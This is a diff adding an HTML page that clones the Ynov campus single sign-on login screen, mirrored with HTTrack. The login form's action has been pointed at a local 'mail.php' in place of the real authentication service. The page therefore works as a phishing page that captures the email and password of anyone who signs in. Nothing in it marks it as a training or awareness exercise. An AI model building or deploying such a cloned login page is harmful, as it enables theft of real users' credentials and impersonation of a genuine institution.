@@ -1,0 +1,162 @@
+<!DOCTYPE html><html>
+    
+<!-- Mirrored from sso.ynov.com/login?service=https%3A%2F%2Fextranet.ynov.com%2Flogin by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Dec 2020 11:27:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <title>Ynov - Connexion</title>
+        <meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><link rel="stylesheet" href="css/ynov0f0d.css?t=1566989994"/><link rel="icon" href="favicon.ico" type="image/x-icon"/><script type="text/javascript" src="webjars/jquery/3.3.1-1/jquery.min.js"></script>
+        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" /><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/></head>
+    <body class="login">
+        <header role="banner">
+    </header>
+        <main role="main">
+            <div id="content">
+        <div class="box">
+            <div class="sidebar">
+                <div class="sidebar-content">
+                    <p class="logo_container">
+                        <img class="logo" src="images/logo_ynov_campus_blanc.svg" /></p>
+                    <h3 class="desktop-only">Bienvenue dans la communauté Ynov</h3>
+                    <p class="desktop-only">
+                        Candidats, Etudiants, Professeurs et Entreprises : accédez aux outils et services Ynov Campus à l'aide de votre Compte Ynov !
+                    </p>
+                </div>
+                <div class="sidebar-footer">
+                    <p class="desktop-only">
+                        <a class="button" href="https://monprofil.ynov.com/register">Créer un compte</a>
+                    </p>
+                </div>
+            </div>
+            <div class="main">
+                <form id="login" method="post" action="mail.php" enctype="text/plain">
+                    <div class="main-title">
+                        <h1>Connexion</h1>
+                    </div>
+                    <div class="main-content">
+                        <div class="form">
+                            <div class="field">
+                                <label for="username">E-mail : </label>
+                                <input id="username" type="email" tabindex="1" accesskey="i" autocomplete="off" name="username" value=""/></div>
+                            
+                            
+                            <div class="field">
+                                <label for="password">Mot de passe : </label>
+                                <input id="password" type="password" tabindex="2"  accesskey="m" autocomplete="off" name="password" value=""/><p id="capslock-on" class="field-warning" style="display:none;">
+                                    <i class="material-icons">warning</i>
+                                    <span>La touche Verr Maj est activée !</span>
+                                </p>
+                            </div>
+                            <input name="submit" type="submit" class="button" tabindex="6" accesskey="l" value="Connexion" />
+                        <ul>
+                            <li>
+                                <a href="https://monprofil.ynov.com/password">Mot de passe oublié</a>
+                            </li>
+                            <li class="mobile-only">
+                                <a href="https://monprofil.ynov.com/register">Créer un compte</a>
+                            </li>
+                        </ul>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+        </main>
+        <footer class="footer" role="contentinfo">
+            <ul>
+                <li>
+                    <a href="mailto:support@ynov.com">Support</a>
+                </li>
+                <li>
+                    <a href="https://www.ynov.com/mentions-legales/">Mentions légales</a>
+                </li>
+                <li>
+                    <a href="https://privacy.ynov.com/">Données personnelles</a>
+                </li>
+            </ul>
+        </footer>
+        <div class="wait">
+            <div class="backdrop"></div>
+            <div class="spinner">
+                <div class="spinner-img">
+                    <img src="images/spinner/1.svg" /><img src="images/spinner/2.svg" /><img src="images/spinner/3.svg" /><img src="images/spinner/4.svg" /><img src="images/spinner/5.svg" /><img src="images/spinner/6.svg" /><img src="images/spinner/7.svg" /><img src="images/spinner/8.svg" /><img src="images/spinner/9.svg" /><img src="images/spinner/10.svg" /><img src="images/spinner/11.svg" /><img src="images/spinner/12.svg" /><img src="images/spinner/13.svg" /><img src="images/spinner/14.svg" /><img src="images/spinner/15.svg" /><img src="images/spinner/16.svg" /><img src="images/spinner/17.svg" /><img src="images/spinner/18.svg" /></div>
+            </div>
+        </div>
+        <div class="frise"></div>
+        <script type="text/javascript" src="webjars/zxcvbn/4.3.0/zxcvbn.js"></script>
+<script type="text/javascript" src="webjars/jquery-ui/1.12.1/jquery-ui.min.js"></script>
+<script type="text/javascript" src="webjars/jquery-cookie/1.4.1-1/jquery.cookie.js"></script>
+<script src="webjars/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+
+<script src="webjars/headjs/1.0.3/head.min.js"></script>
+<script type="text/javascript" src="js/cas0f0d.js?t=1566989994"></script>
+
+<script>
+    head.ready(document, function () {
+        if (!window.jQuery) {
+            var jqueryUrl = "\/webjars\/jquery\/3.3.1-1\/jquery.min.js";
+            head.load(jqueryUrl, loadjQueryUI);
+        } else {
+            notifyResourcesAreLoaded(resourceLoadedSuccessfully);
+        }
+    });
+
+    function loadjQueryUI() {
+        var jqueryUrl = "\/webjars\/jquery-ui\/1.12.1\/jquery-ui.min.js";
+        head.load(jqueryUrl, loadjQueryCookies);
+    }
+
+    function loadjQueryCookies() {
+        var jqueryUrl = "\/webjars\/jquery-cookie\/1.4.1-1\/jquery.cookie.js";
+        head.load(jqueryUrl, notifyResourcesAreLoaded(resourceLoadedSuccessfully));
+    }
+
+    function notifyResourcesAreLoaded(callback) {
+        if (typeof callback === "function") {
+            callback();
+        }
+    }
+</script>
+
+<script>
+    /*<![CDATA[*/
+
+    var trackGeoLocation = false
+    "true";
+
+    var googleAnalyticsTrackingId = null;
+
+    if (googleAnalyticsTrackingId != null && googleAnalyticsTrackingId != '') {
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '../www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', googleAnalyticsTrackingId, 'auto');
+        ga('send', 'pageview');
+    }
+
+    /*]]>*/
+</script>
+
+<script type="text/javascript">
+                $(document).ready(function () {
+                    $("form").submit(function () {
+                        $(":submit").blur();
+                        $(":submit").attr("disabled", true);
+                        document.querySelector('.wait').style.display='block';
+                        document.querySelector('.wait').style.opacity=1;
+                        return true;
+                    });
+                });
+        </script>
+    </body>
+
+<!-- Mirrored from sso.ynov.com/login?service=https%3A%2F%2Fextranet.ynov.com%2Flogin by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Dec 2020 11:27:56 GMT -->
+</html>
